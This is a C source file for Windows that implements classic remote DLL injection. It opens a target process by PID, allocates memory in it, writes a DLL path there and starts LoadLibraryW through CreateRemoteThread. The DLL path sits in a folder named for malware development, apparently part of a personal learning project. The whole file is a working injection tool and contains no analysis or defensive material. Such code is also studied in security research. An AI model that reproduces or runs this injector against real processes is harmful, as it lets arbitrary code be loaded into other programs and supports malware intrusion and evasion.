#include <Windows.h>
#include <stdio.h>

const char* x = "[+]";
const char* y = "[-]";
const char* z = "[!]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\<Name>\\Desktop\\Setup\\Folders\\Development\\Malware\\crow-rip\\randomDLL\\randomDLL.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char const* argv[])
{
    if (argc < 2) {
        printf("\t %s USAGE: program.exe <PID>\n", z);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("\t %s Trying to open Program with Process ID: (%ld) \n", x, PID);

    /*HANDLE OpenProcess(
      [in] DWORD dwDesiredAccess,
      [in] BOOL  bInheritHandle,
      [in] DWORD dwProcessId
    );*/
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL) {
        printf("\t %s Failed to open Program with Process ID: (%ld). error: %ld \n", z, PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("\t %s Got the Process Handle : 0x%p \n", x, hProcess);

    /*LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
    );*/
    rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); //Acts as a canvas
    printf("\t %s Buffer of %zu-bytes generated with PAGEREADWRITE permission.\n", x, dllPathSize);
    
    if (rBuffer == NULL) {
        printf("\t %s couldn't get the buffer, error: %ld \n", z, GetLastError());
        return EXIT_FAILURE;
    }

    WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL); // We point to the canvas we want to work on
    printf("\t %s wrote [%S] to process memory.\n", x, dllPath);

    /*HMODULE GetModuleHandleW(
    [in, optional] LPCWSTR lpModuleName
    );*/
    hKernel32 = GetModuleHandleW(L"Kernel32"); // Module to Kernel 32 
    if (hKernel32 == NULL) {
        printf("\t %s failed to get a handel to Kernel32.dll, error: %ld \n", z, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("\t %s got handel to Kernel32.dll.\n", x);

    LPTHREAD_START_ROUTINE startthis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW"); // Using Modules 
    printf("\t %s Got Address of LoadLibraryW()\n\t ---0x%p\n", x, startthis);

    hThread = CreateRemoteThread(hProcess, NULL, 0, startthis, rBuffer, 0, &TID);
    if (hThread == NULL) {
        printf("\t %s failed to get a handel to thread.dll, error: %ld \n", z, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("\t %s got handle to the thread (%ld).\n", x, TID);
    printf("\t %s Waiting for thread to finish .. ", x);

    WaitForSingleObject(hThread, INFINITE);
    
    printf("\t %s Cleaning Process\n", y);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("\t %s Cleaning Done\n", x);

    return EXIT_SUCCESS;
}